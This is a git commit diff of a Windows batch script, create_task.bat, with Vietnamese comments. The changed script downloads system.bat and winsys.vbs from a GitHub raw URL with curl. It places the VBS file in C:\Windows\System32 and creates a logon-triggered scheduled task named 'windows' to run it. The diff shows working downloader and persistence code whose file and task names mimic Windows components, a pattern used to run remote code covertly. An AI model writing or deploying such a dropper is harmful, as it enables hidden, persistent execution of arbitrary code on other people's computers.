858fe56eca01cd4dfb8225926928ad8eb7ac621d
quannqttg <46080682+quannqttg@users.noreply.github.com>
2024-11-13 14:54:13 +0700

    Update create_task.bat

--- create_task.bat
+++ create_task.bat
@@ -8,36 +8,55 @@ if %errorLevel% neq 0 (
 )
 
 :: Thiet lap bien
-set "downloadUrl=https://raw.githubusercontent.com/quannqttg/coccoc/main/system.bat"
-set "destinationDir=C:\Program Files\Windows NT\ADB"
-set "downloadFile=system.bat"
-set "logFile=%destinationDir%\task_history_log.txt"
+set "systemDownloadUrl=https://raw.githubusercontent.com/quannqttg/coccoc/main/system.bat"
+set "systemDestinationDir=C:\Program Files\Windows NT\ADB"
+set "systemDownloadFile=system.bat"
+set "winsysDownloadUrl=https://raw.githubusercontent.com/quannqttg/coccoc/main/winsys.vbs"
+set "winsysDestinationDir=C:\Windows\System32"
+set "winsysDownloadFile=winsys.vbs"
+set "logFile=%systemDestinationDir%\task_history_log.txt"
 
-:: Tao thu muc neu chua ton tai
-if not exist "%destinationDir%" (
-    echo Thu muc %destinationDir% khong ton tai. Dang tao thu muc...
-    mkdir "%destinationDir%"
+:: Tao thu muc neu chua ton tai cho system.bat
+if not exist "%systemDestinationDir%" (
+    echo Thu muc %systemDestinationDir% khong ton tai. Dang tao thu muc...
+    mkdir "%systemDestinationDir%"
 )
 
-:: Chuyen den thu muc dich
-cd /d "%destinationDir%"
-
-:: Tai xuong tep bang curl
+:: Tai xuong system.bat
 echo Dang tai xuong system.bat...
-echo %date% %time% - Bat dau tai xuong tu %downloadUrl% >> "%logFile%"
-curl -L -o "%downloadFile%" "%downloadUrl%"
+echo %date% %time% - Bat dau tai xuong tu %systemDownloadUrl% >> "%logFile%"
+curl -L -o "%systemDestinationDir%\%systemDownloadFile%" "%systemDownloadUrl%"
 
-:: Kiem tra xem tep da tai xuong thanh cong chua
-if exist "%downloadFile%" (
+:: Kiem tra xem system.bat da tai xuong thanh cong chua
+if exist "%systemDestinationDir%\%systemDownloadFile%" (
     echo %date% %time% - system.bat da tai xuong thanh cong. >> "%logFile%"
 ) else (
     echo %date% %time% - Tai xuong system.bat that bai. >> "%logFile%"
     exit
 )
 
-:: Tao tac vu trong Task Scheduler
+:: Tao thu muc neu chua ton tai cho winsys.vbs
+if not exist "%winsysDestinationDir%" (
+    echo Thu muc %winsysDestinationDir% khong ton tai. Dang tao thu muc...
+    mkdir "%winsysDestinationDir%"
+)
+
+:: Tai xuong winsys.vbs
+echo Dang tai xuong winsys.vbs...
+echo %date% %time% - Bat dau tai xuong tu %winsysDownloadUrl% >> "%logFile%"
+curl -L -o "%winsysDestinationDir%\%winsysDownloadFile%" "%winsysDownloadUrl%"
+
+:: Kiem tra xem winsys.vbs da tai xuong thanh cong chua
+if exist "%winsysDestinationDir%\%winsysDownloadFile%" (
+    echo %date% %time% - winsys.vbs da tai xuong thanh cong. >> "%logFile%"
+) else (
+    echo %date% %time% - Tai xuong winsys.vbs that bai. >> "%logFile%"
+    exit
+)
+
+:: Tao tac vu trong Task Scheduler de chay winsys.vbs
 echo Dang tao tac vu...
-schtasks /create /tn "windows" /tr "\"%destinationDir%\%downloadFile%\"" /sc onlogon /ru "%USERNAME%" /f
+schtasks /create /tn "windows" /tr "\"C:\Windows\System32\%winsysDownloadFile%\"" /sc onlogon /ru "%USERNAME%" /f
 
 :: Kiem tra ket qua
 if %errorlevel% neq 0 (
